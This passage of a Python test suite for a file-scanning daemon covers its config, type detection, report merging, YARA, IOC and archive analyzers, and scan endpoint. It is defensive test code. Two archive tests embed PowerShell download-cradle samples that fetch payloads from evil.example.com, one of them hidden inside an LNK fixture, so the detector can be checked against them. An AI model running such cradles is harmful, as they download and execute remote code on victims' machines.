        # Should not raise and should normalise api_key
        xspct.config["xspct_api_key"] = "single-key"
        xspct.load_config(None)
        assert isinstance(xspct.config["xspct_api_key"], list)
        assert xspct.config["xspct_api_key"] == ["single-key"]

    def test_missing_file_exits(self, tmp_path):
        with pytest.raises(SystemExit):
            xspct.load_config(str(tmp_path / "nonexistent.yml"))

    def test_valid_yaml_updates_config(self, tmp_path):
        cfg = tmp_path / "xspct.yml"
        cfg.write_text("xspct_listen_port: 9999\n")
        original = xspct.config["xspct_listen_port"]
        try:
            xspct.load_config(str(cfg))
            assert xspct.config["xspct_listen_port"] == 9999
        finally:
            xspct.config["xspct_listen_port"] = original

    def test_sub_dict_is_merged_not_replaced(self, tmp_path):
        cfg = tmp_path / "xspct.yml"
        cfg.write_text("xspct_redis_cache:\n  host: redis.custom.example\n")
        original_port = xspct.config["xspct_redis_cache"]["port"]
        try:
            xspct.load_config(str(cfg))
            assert xspct.config["xspct_redis_cache"]["host"] == "redis.custom.example"
            assert xspct.config["xspct_redis_cache"]["port"] == original_port
        finally:
            xspct.config["xspct_redis_cache"]["host"] = "localhost"

    def test_invalid_yaml_exits(self, tmp_path):
        cfg = tmp_path / "bad.yml"
        cfg.write_text(": invalid: yaml: {unclosed\n")
        with pytest.raises(SystemExit):
            xspct.load_config(str(cfg))

    def test_string_api_key_normalised_to_list(self, tmp_path):
        cfg = tmp_path / "xspct.yml"
        cfg.write_text("xspct_api_key: my-secret-key\n")
        try:
            xspct.load_config(str(cfg))
            assert xspct.config["xspct_api_key"] == ["my-secret-key"]
        finally:
            xspct.config["xspct_api_key"] = []

    def test_empty_string_api_key_normalised_to_empty_list(self, tmp_path):
        cfg = tmp_path / "xspct.yml"
        cfg.write_text('xspct_api_key: ""\n')
        try:
            xspct.load_config(str(cfg))
            assert xspct.config["xspct_api_key"] == []
        finally:
            xspct.config["xspct_api_key"] = []


# ===========================================================================
# UNIT TESTS — configure_logging
# ===========================================================================


class TestConfigureLogging:
    def test_calling_twice_does_not_duplicate_handlers(self):
        xspct.configure_logging()
        xspct.configure_logging()
        real_handlers = [
            h for h in xspct.logger.handlers if not isinstance(h, logging.NullHandler)
        ]
        assert len(real_handlers) == 1

    def test_log_level_applied(self):
        xspct.config["xspct_log_level"] = logging.WARNING
        xspct.configure_logging()
        assert xspct.logger.level == logging.WARNING
        xspct.config["xspct_log_level"] = 20  # restore
        xspct.configure_logging()

    def test_handler_is_stream_handler(self):
        xspct.configure_logging()
        real_handlers = [
            h for h in xspct.logger.handlers if not isinstance(h, logging.NullHandler)
        ]
        assert isinstance(real_handlers[0], logging.StreamHandler)


# ===========================================================================
# UNIT TESTS — get_detected_type (image / archive types)
# ===========================================================================


class TestGetDetectedTypeExtended:
    """Cover image and archive detection added in Phase 8."""

    def test_image_by_mime_jpeg(self, daemon):
        assert daemon.get_detected_type("image/jpeg", None, None, None) == "image"

    def test_image_by_mime_png(self, daemon):
        assert daemon.get_detected_type("image/png", None, None, None) == "image"

    def test_image_by_mime_gif(self, daemon):
        assert daemon.get_detected_type("image/gif", None, None, None) == "image"

    def test_image_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "photo.jpg", None) == "image"

    def test_image_png_magic_bytes(self, daemon):
        # PNG header without MIME/extension — get_detected_type relies on MIME
        # or extension for image detection; raw magic bytes alone → unknown
        png_header = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
        result = daemon.get_detected_type(None, None, None, png_header)
        assert result in ("image", "unknown")  # depends on libmagic availability

    def test_archive_by_mime_zip(self, daemon):
        assert (
            daemon.get_detected_type("application/zip", None, None, None) == "archive"
        )

    def test_archive_by_extension_zip(self, daemon):
        assert daemon.get_detected_type(None, None, "payload.zip", None) == "archive"

    def test_archive_by_extension_7z(self, daemon):
        assert daemon.get_detected_type(None, None, "payload.7z", None) == "archive"

    def test_text_by_mime(self, daemon):
        assert daemon.get_detected_type("text/plain", None, None, None) == "text"


# ===========================================================================
# UNIT TESTS — _make_base_report (new fields present)
# ===========================================================================


class TestMakeBaseReport:
    def test_all_new_fields_present(self, daemon):
        r = daemon._make_base_report("f.pdf", "abc123", "application/pdf", "PDF doc")
        for field in (
            "yara_matches",
            "iocs_extended",
            "pdfid_keywords",
            "pdfid_meta",
            "archive_files",
            "exif",
            "text_full",
        ):
            assert field in r, f"Missing field: {field}"

    def test_yara_matches_is_list(self, daemon):
        r = daemon._make_base_report("f.pdf", "abc", None, None)
        assert isinstance(r["yara_matches"], list)

    def test_iocs_extended_is_dict(self, daemon):
        r = daemon._make_base_report("f.pdf", "abc", None, None)
        assert isinstance(r["iocs_extended"], dict)

    def test_archive_files_is_list(self, daemon):
        r = daemon._make_base_report("f.pdf", "abc", None, None)
        assert isinstance(r["archive_files"], list)

    def test_exif_is_dict(self, daemon):
        r = daemon._make_base_report("f.pdf", "abc", None, None)
        assert isinstance(r["exif"], dict)

    def test_text_full_is_empty_list_by_default(self, daemon):
        r = daemon._make_base_report("f.pdf", "abc", None, None)
        assert r["text_full"] == []


# ===========================================================================
# UNIT TESTS — merge_reports (new fields)
# ===========================================================================


class TestMergeReportsNewFields:
    def _base(self, daemon):
        return daemon._make_base_report("f", "h", None, None)

    def test_yara_matches_merged_no_duplicates(self, daemon):
        base = self._base(daemon)
        hit = {
            "engine": "classic",
            "rule": "Eicar",
            "namespace": "",
            "tags": [],
            "meta": {},
            "strings": [],
        }
        base["yara_matches"] = [hit]
        daemon.merge_reports(
            base,
            {
                "yara_matches": [
                    hit,
                    {
                        "engine": "yara-x",
                        "rule": "Other",
                        "namespace": "",
                        "tags": [],
                        "meta": {},
                        "strings": [],
                    },
                ]
            },
        )
        rules = [m["rule"] for m in base["yara_matches"]]
        assert rules.count("Eicar") == 1
        assert "Other" in rules

    def test_iocs_extended_deep_merged(self, daemon):
        base = self._base(daemon)
        base["iocs_extended"] = {"url": ["http://a.example"]}
        daemon.merge_reports(
            base,
            {
                "iocs_extended": {
                    "url": ["http://b.example"],
                    "email": ["x@example.com"],
                }
            },
        )
        assert "http://a.example" in base["iocs_extended"]["url"]
        assert "http://b.example" in base["iocs_extended"]["url"]
        assert "x@example.com" in base["iocs_extended"]["email"]

    def test_archive_files_appended(self, daemon):
        base = self._base(daemon)
        base["archive_files"] = [{"name": "a.txt", "size": 10}]
        daemon.merge_reports(base, {"archive_files": [{"name": "b.pdf", "size": 20}]})
        names = [f["name"] for f in base["archive_files"]]
        assert "a.txt" in names
        assert "b.pdf" in names

    def test_archive_files_no_duplicates(self, daemon):
        base = self._base(daemon)
        item = {"name": "x.doc", "size": 5}
        base["archive_files"] = [item]
        daemon.merge_reports(base, {"archive_files": [item]})
        assert len(base["archive_files"]) == 1

    def test_exif_first_wins(self, daemon):
        base = self._base(daemon)
        base["exif"] = {"Make": "Canon"}
        daemon.merge_reports(base, {"exif": {"Make": "Nikon"}})
        assert base["exif"]["Make"] == "Canon"

    def test_exif_empty_replaced(self, daemon):
        base = self._base(daemon)
        daemon.merge_reports(base, {"exif": {"Make": "Sony"}})
        assert base["exif"]["Make"] == "Sony"

    def test_text_full_segments_accumulate(self, daemon):
        base = self._base(daemon)
        daemon.merge_reports(base, {"text_full": [{"source": "a", "text": "alpha"}]})
        daemon.merge_reports(base, {"text_full": [{"source": "b", "text": "beta"}]})
        texts = {s["text"] for s in base.get("text_segments", [])}
        assert "alpha" in texts and "beta" in texts

    def test_text_segments_dedup(self, daemon):
        base = self._base(daemon)
        daemon.merge_reports(base, {"text_segments": [{"source": "a", "text": "x"}]})
        daemon.merge_reports(base, {"text_segments": [{"source": "a", "text": "x"}]})
        assert sum(1 for s in base["text_segments"] if s["text"] == "x") == 1


# ===========================================================================
# UNIT TESTS — analyze_yara (no engine installed path)
# ===========================================================================


class TestAnalyzeYaraNoEngine:
    def test_returns_none_when_no_rules_loaded(self, daemon):
        # daemon fixture has no YARA rules compiled
        result = daemon.analyze_yara(b"test data")
        assert result is None

    def test_yara_x_rules_none_skipped(self, daemon):
        assert getattr(daemon, "_yara_x_rules", None) is None
        # Should not raise
        result = daemon.analyze_yara(b"\x00" * 64)
        assert result is None


# ===========================================================================
# UNIT TESTS — sync_analyze YARA integration
# ===========================================================================


class TestSyncAnalyzeYara:
    """Verify that sync_analyze calls YARA when rules are available and that the
    result is reflected in the returned report's yara_matches list."""

    def test_no_rules_yara_matches_empty(self, daemon):
        # No rules loaded \u2014 yara_matches must be present but empty
        report = daemon.sync_analyze("s", "file.txt", b"hello world", "text/plain")
        assert "yara_matches" in report
        assert report["yara_matches"] == []

    def test_yara_called_when_rules_loaded(self, daemon, monkeypatch):
        # Patch analyze_yara to return a fake match so we can assert it was called
        hit = {"rule": "TestRule", "engine": "classic", "tags": [], "meta": {}}
        monkeypatch.setattr(daemon, "_yara_rules", object())  # non-None triggers check
        # yara analyzer is disabled by default; enable it for this test
        saved = xspct.config["xspct_analyzers"]["yara"]["enabled"]
        xspct.config["xspct_analyzers"]["yara"]["enabled"] = True
        call_log = []

        def _fake_yara(data, filename="", file_mime="", s=""):
            call_log.append(data)
            return {"yara_matches": [hit]}

        monkeypatch.setattr(daemon, "analyze_yara", _fake_yara)
        try:
            report = daemon.sync_analyze("s", "file.txt", b"hello world", "text/plain")
        finally:
            xspct.config["xspct_analyzers"]["yara"]["enabled"] = saved
        assert call_log, "analyze_yara was not called"
        assert hit in report["yara_matches"]


# ===========================================================================
# UNIT TESTS — analyze_iocsearcher
# ===========================================================================


class TestAnalyzeIocsearcher:
    def test_returns_none_when_not_installed(self, daemon):
        if xspct.HAS_IOCSEARCHER:
            pytest.skip("iocsearcher is installed; skipping no-engine path")
        result = daemon.analyze_iocsearcher("some text with http://example.com", "test")
        assert result is None

    def test_returns_dict_when_installed(self, daemon):
        if not xspct.HAS_IOCSEARCHER:
            pytest.skip("iocsearcher not installed")
        result = daemon.analyze_iocsearcher(
            "Visit http://example.com for details", "test"
        )
        # Returns None if no hits, or dict with iocs_extended key
        assert result is None or ("iocs_extended" in result)

    def test_empty_text_returns_none(self, daemon):
        if not xspct.HAS_IOCSEARCHER:
            pytest.skip("iocsearcher not installed")
        result = daemon.analyze_iocsearcher("", "test")
        assert result is None


# ===========================================================================
# UNIT TESTS — analyze_archive
# ===========================================================================


class TestAnalyzeArchive:
    def test_non_archive_bytes_returns_none(self, daemon):
        result = daemon.analyze_archive("s", "random.bin", b"\x00\x01\x02\x03" * 32, 0)
        assert result is None

    def test_depth_exceeded_returns_none(self, daemon):
        # max depth is 2 by default; depth=2 should be rejected
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("hello.txt", "hello world")
        saved = xspct.config["xspct_archive_max_depth"]
        xspct.config["xspct_archive_max_depth"] = 1
        try:
            result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), depth=1)
        finally:
            xspct.config["xspct_archive_max_depth"] = saved
        assert result is None

    def test_empty_zip_returns_none(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w"):
            pass
        result = daemon.analyze_archive("s", "empty.zip", buf.getvalue(), 0)
        assert result is None

    def test_zip_with_text_file_extracted(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("readme.txt", "hello world content")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        # txt is 'text' type — analyze_text runs via sync_analyze
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "readme.txt" in names

    def test_zip_with_pdf_extracted(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("doc.pdf", PDF_CLEAN)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "doc.pdf" in names

    def test_zip_script_member_runs_script_analyzer(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr(
                "loader.ps1",
                "invoke-webrequest http://evil.example.com/payload.exe",
            )
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert "download-cradle" in _keywords(result["analyses"])
        member = next(
            item for item in result["archive_files"] if item["name"] == "loader.ps1"
        )
        assert member["detected_type"] == "script"
        assert "script" in member["analyzers_run"]

    def test_zip_lnk_member_runs_lnk_analyzer(self, daemon):
        lnk_data = _make_lnk(
            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            arguments=(
                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
                "DownloadString('http://evil.example.com/a.ps1')"
            ),
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("invoice.lnk", lnk_data)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        member = next(
            item for item in result["archive_files"] if item["name"] == "invoice.lnk"
        )
        assert member["detected_type"] == "lnk"
        assert "lnk" in member["analyzers_run"]
        assert "download-cradle" in _keywords(result["analyses"])

    def test_zip_lnk_member_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        monkeypatch.setattr(
            daemon, "extract_text_preview", MagicMock(return_value="raw fallback")
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr(
                "invoice.lnk",
                _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            )

        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)

        member = next(
            item for item in result["archive_files"] if item["name"] == "invoice.lnk"
        )
        assert "lnk" in member["analyzers_run"]
        assert any(
            segment["source"] == "lnk" and segment["text"] == "raw fallback"
            for segment in result["text_segments"]
        )

    def test_size_limit_stops_extraction(self, daemon):
        buf = io.BytesIO()
        big_content = b"A" * 1000
        with zipfile.ZipFile(buf, "w") as z:
            for i in range(10):
                z.writestr(f"file{i}.txt", big_content)
        saved = xspct.config["xspct_archive_max_size"]
        xspct.config["xspct_archive_max_size"] = 2500  # stop early
        try:
            result = daemon.analyze_archive("s", "big.zip", buf.getvalue(), 0)
        finally:
            xspct.config["xspct_archive_max_size"] = saved
        # Some files extracted, but not all 10
        if result:
            assert len(result["archive_files"]) < 10

    def test_disabled_analyzer_returns_none(self, daemon):
        saved = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = False
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("f.txt", "hi")
        try:
            result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        finally:
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved
        assert result is None

    def test_archive_report_has_yara_matches_key(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("f.txt", "some text")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        # yara_matches key must always be present (YARA may have no rules loaded)
        assert "yara_matches" in result

    def test_archive_report_has_iocs_extended_key(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("f.txt", "some text")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert "iocs_extended" in result

    def test_archive_text_member_gets_text_preview(self, daemon):
        content = b"Hello from inside the archive"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("note.txt", content)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        # text member now goes through sync_analyze which populates text_preview
        assert result.get("text_preview") or result["archive_files"]

    def test_archive_pdf_member_propagates_yara_matches(self, daemon):
        # Even without YARA rules loaded the key must exist (empty list)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("doc.pdf", PDF_CLEAN)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert isinstance(result.get("yara_matches", []), list)


class TestArchiveCapabilityGating:
    def test_archive_analyzer_disabled_without_backend(self, daemon, monkeypatch):
        saved_fallback = xspct.config["xspct_archive_stdlib_fallback"]
        saved_enabled = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        xspct.config["xspct_archive_stdlib_fallback"] = False
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = True
        try:
            enabled = daemon._resolve_enabled_analyzers()
        finally:
            xspct.config["xspct_archive_stdlib_fallback"] = saved_fallback
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved_enabled
        assert "archive" not in enabled

    def test_archive_analyzer_enabled_with_stdlib_fallback(self, daemon, monkeypatch):
        saved_fallback = xspct.config["xspct_archive_stdlib_fallback"]
        saved_enabled = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        xspct.config["xspct_archive_stdlib_fallback"] = True
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = True
        try:
            enabled = daemon._resolve_enabled_analyzers()
        finally:
            xspct.config["xspct_archive_stdlib_fallback"] = saved_fallback
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved_enabled
        assert "archive" in enabled

    def test_sync_analyze_zip_without_backend_returns_unknown(
        self, daemon, monkeypatch
    ):
        saved_fallback = xspct.config["xspct_archive_stdlib_fallback"]
        saved_enabled = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        xspct.config["xspct_archive_stdlib_fallback"] = False
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = True

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("readme.txt", "hello world")

        try:
            report = daemon.sync_analyze(
                "s", "test.zip", buf.getvalue(), "application/zip"
            )
        finally:
            xspct.config["xspct_archive_stdlib_fallback"] = saved_fallback
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved_enabled

        assert report["detected_type"] == "unknown"
        assert report["archive_files"] == []


# ===========================================================================
# UNIT TESTS — sflock2 archive extraction path
# ===========================================================================


class _SflockFile:
    """Minimal stub mimicking sflock2's File object."""

    def __init__(
        self, filename="", contents=b"", children=None, error=None, password=None
    ):
        self.filename = filename
        self.contents = contents
        self.children = children or []
        self.error = error
        self.password = password


class TestAnalyzeArchiveSflock:
    """Tests for the sflock2-backed extraction path in analyze_archive."""

    def _make_sflock_result(self, members: list):
        """Build a fake sflock File tree from a list of (name, bytes) tuples."""
        children = [_SflockFile(filename=name, contents=data) for name, data in members]
        return _SflockFile(filename="archive.zip", children=children)

    def test_sflock_path_extracts_text_member(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = self._make_sflock_result([("readme.txt", b"hello from sflock")])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "archive.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "readme.txt" in names

    def test_sflock_path_extracts_pdf_member(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = self._make_sflock_result([("doc.pdf", PDF_CLEAN)])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "test.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        assert any(f["name"] == "doc.pdf" for f in result["archive_files"])

    def test_sflock_empty_children_returns_none(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = _SflockFile(filename="bad.zip", children=[])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "bad.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is None

    def test_sflock_password_retry_stops_on_success(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        calls = []

        def _unpack(**kw):
            calls.append(kw.get("password"))
            if kw.get("password") == "secret":
                return self._make_sflock_result([("protected.txt", b"unlocked")])
            return _SflockFile(
                filename="enc.zip", children=[], error="Decryption failed"
            )

        daemon.passwords = ["wrong", "secret", "notneeded"]
        monkeypatch.setattr(
            xspct, "_sflock", type("M", (), {"unpack": staticmethod(_unpack)})()
        )
        result = daemon.analyze_archive("s", "enc.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        assert "secret" in calls
        assert "notneeded" not in calls  # stopped after success

    def test_sflock_size_limit_precheck_returns_none(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        saved = xspct.config["xspct_archive_max_size"]
        xspct.config["xspct_archive_max_size"] = 10  # tiny limit
        try:
            result = daemon.analyze_archive("s", "huge.zip", b"X" * 100, 0)
        finally:
            xspct.config["xspct_archive_max_size"] = saved
        assert result is None

    def test_sflock_nested_container_walked(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        # Simulate a ZIP-inside-ZIP already unpacked by sflock
        inner_leaf = _SflockFile(filename="inner.txt", contents=b"nested content")
        outer_child = _SflockFile(filename="inner.zip", children=[inner_leaf])
        root = _SflockFile(filename="outer.zip", children=[outer_child])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: root)})(),
        )
        result = daemon.analyze_archive("s", "outer.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "inner.txt" in names

    def test_sflock_decryption_password_stored_in_report(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = self._make_sflock_result([("secret.txt", b"payload")])
        fake_result.password = "infected"
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "enc.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        assert result.get("decryption_password") == "infected"
        assert result.get("decrypted") is True

    def test_sflock_exception_falls_back_gracefully(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)

        def _boom(**kw):
            raise RuntimeError("sflock internal error")

        monkeypatch.setattr(
            xspct, "_sflock", type("M", (), {"unpack": staticmethod(_boom)})()
        )
        # Should return None (not raise)
        result = daemon.analyze_archive("s", "corrupt.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is None


class TestGetDetectedTypeSflockFormats:
    """Ensure new archive formats are recognised after sflock support was added."""

    def test_rar_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "archive.rar", None) == "archive"

    def test_eml_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "email.eml", None) == "archive"

    def test_msg_mime_returns_archive(self, daemon):
        assert (
            daemon.get_detected_type("application/vnd.ms-outlook", None, None, None)
            == "archive"
        )

    def test_eml_mime_returns_archive(self, daemon):
        assert daemon.get_detected_type("message/rfc822", None, None, None) == "archive"

    def test_cab_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "setup.cab", None) == "archive"

    def test_ace_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "archive.ace", None) == "archive"

    def test_iso_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "disc.iso", None) == "archive"

    def test_tar_gz_by_extension_tgz(self, daemon):
        assert daemon.get_detected_type(None, None, "pkg.tgz", None) == "archive"

    def test_tar_bz2_by_extension_tbz2(self, daemon):
        assert daemon.get_detected_type(None, None, "src.tbz2", None) == "archive"

    def test_rar_desc_returns_archive(self, daemon):
        assert (
            daemon.get_detected_type(None, "rar archive data", None, None) == "archive"
        )

    def test_vhd_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "disk.vhd", None) == "archive"

    def test_vhdx_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "disk.vhdx", None) == "archive"

    def test_vhd_by_magic_desc(self, daemon):
        assert (
            daemon.get_detected_type(
                None, "Microsoft Disk Image, Virtual Server", None, None
            )
            == "archive"
        )

    def test_vhdx_by_magic_desc(self, daemon):
        assert (
            daemon.get_detected_type(None, "Microsoft Disk Image Extended", None, None)
            == "archive"
        )


# ===========================================================================
# UNIT TESTS — PartialReport
# ===========================================================================


class TestPartialReport:
    def _base(self, daemon):
        b = daemon._make_base_report("f.pdf", "abc", None, None)
        b["analyzers_completed"] = []
        b["analyzers_pending"] = ["pdf", "yara"]
        return b

    @pytest.mark.asyncio
    async def test_snapshot_returns_copy(self, daemon):
        pr = xspct.PartialReport(self._base(daemon), ["pdf", "yara"])
        snap = pr.snapshot()
        assert snap is not pr.report

    @pytest.mark.asyncio
    async def test_merge_moves_analyzer_to_completed(self, daemon):
        pr = xspct.PartialReport(self._base(daemon), ["pdf", "yara"])
        await pr.merge("pdf", {"analyses": []}, daemon)
        assert "pdf" in pr.successful
        assert "pdf" not in pr.report.get("analyzers_pending", [])

    @pytest.mark.asyncio
    async def test_merge_none_result_still_completes(self, daemon):
        pr = xspct.PartialReport(self._base(daemon), ["pdf"])
        await pr.merge("pdf", None, daemon)
        # Should still be marked completed even with None result
        assert "pdf" in pr.successful or "pdf" not in pr.report.get(
            "analyzers_pending", []
        )


# ===========================================================================
# UNIT TESTS — text_full via sync_analyze
# ===========================================================================


class TestTextFull:
    def test_text_full_is_list(self, daemon):
        """sync_analyze finalizes text_full as a list of {source, text}."""
        r = daemon.sync_analyze("s", "doc.pdf", PDF_CLEAN, None)
        assert isinstance(r["text_full"], list)

    def test_scan_report_has_text_full_key(self):
        """text_full key is always present in the base report (empty list)."""
        d = xspct.InspectorDaemon()
        r = d._make_base_report("f", "h", None, None)
        assert r["text_full"] == []

    async def test_pipeline_text_full_uses_analyzer_text(self, daemon, monkeypatch):
        """Analyzer-provided text segments populate text_full."""
        long_text = "ocr text " * 100

        def fake_analyze_pdf(data, custom_passwords=None):
            rep = {
                "analyses": [],
                "iocs": {"urls": [], "ips": [], "domains": []},
            }
            daemon._add_text_segment(rep, "pdf", long_text)
            return rep

        monkeypatch.setattr(daemon, "analyze_pdf", fake_analyze_pdf)
        monkeypatch.setattr(daemon, "extract_text_preview", lambda *a, **k: "")
        partial = await daemon.analyze_pipeline(
            "s", "scan.pdf", PDF_CLEAN, "application/pdf", types_to_run=["pdf"]
        )
        assert any("ocr text" in seg["text"] for seg in partial.report["text_full"])
        assert "text_segments" not in partial.report


# ===========================================================================
# INTEGRATION TESTS — octet-stream upload
# ===========================================================================


class TestScanOctetStream:
    async def test_octet_stream_clean_pdf_returns_200(self, client):
        r = await client.post(
            "/v1/scan?filename=test.pdf",
            data=PDF_CLEAN,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "pdf"
        assert body["file"]["sha256"] == hashlib.sha256(PDF_CLEAN).hexdigest()

    async def test_octet_stream_same_hash_as_multipart(self, client):
        r1 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "a.pdf"))
        b1 = await r1.json()

        r2 = await client.post(
            "/v1/scan",
            data=PDF_CLEAN,
            headers={"Content-Type": "application/octet-stream"},
        )
        b2 = await r2.json()
        assert b1["file"]["sha256"] == b2["file"]["sha256"]

    async def test_unsupported_content_type_returns_415(self, client):
        r = await client.post(
            "/v1/scan",
            data=b"some data",
            headers={"Content-Type": "text/xml"},
        )
        assert r.status == 415

    async def test_octet_stream_with_filename_query_param(self, client):
        r = await client.post(
            "/v1/scan?filename=payload.html",
            data=HTML_CLEAN,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "html"


# ===========================================================================
# INTEGRATION TESTS — admin /admin/reload
# ===========================================================================

# ===========================================================================
# UNIT / INTEGRATION TESTS — Two-tier concurrency
# ===========================================================================


class TestTwoTierConcurrency:
    """Verify foreground/background semaphore lifecycle in handle_scan."""

    # --- Config defaults -------------------------------------------------

    def test_default_foreground_slots(self):
        assert xspct.config["xspct_foreground_slots"] == 16

    def test_default_background_slots(self):
        assert xspct.config["xspct_background_slots"] == 4

    def test_stats_keys_exist(self):
        for key in (
            "foreground_overloaded",
            "background_rejected",
            "background_completed",
            "background_errors",
        ):
            assert key in xspct.stats

    # --- Semaphore initialisation ----------------------------------------

    def test_daemon_semaphores_none_before_setup(self):
        d = xspct.InspectorDaemon()
        assert d._fg_sem is None
        assert d._bg_sem is None

    async def test_semaphores_initialised_after_setup(self, client):
        # client fixture creates a full app via make_app() → setup()
        # The daemon attached to the app must have non-None semaphores.
        app_daemon = client.server.app.get("daemon")
        if app_daemon is None:
            pytest.skip('app does not expose daemon via app["daemon"]')
        assert app_daemon._fg_sem is not None
        assert app_daemon._bg_sem is not None

    # --- Normal scan finishes within timeout (foreground slot released) ---

    async def test_normal_scan_releases_fg_slot(self, client):
        r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "test.pdf"))
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"

    # --- Overload: all foreground slots taken → 503 ----------------------

    async def test_overloaded_returns_503(self, aiohttp_client):
        """Simulate all foreground slots occupied; next request gets 503."""
        xspct.config["xspct_foreground_slots"] = 2
        xspct.config["xspct_background_slots"] = 1
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        daemon = app["daemon"]
        # Occupy every foreground slot
        n = daemon._fg_sem._value
        for _ in range(n):
            await daemon._fg_sem.acquire()
        before = xspct.stats["foreground_overloaded"]
        try:
            r = await client.post(
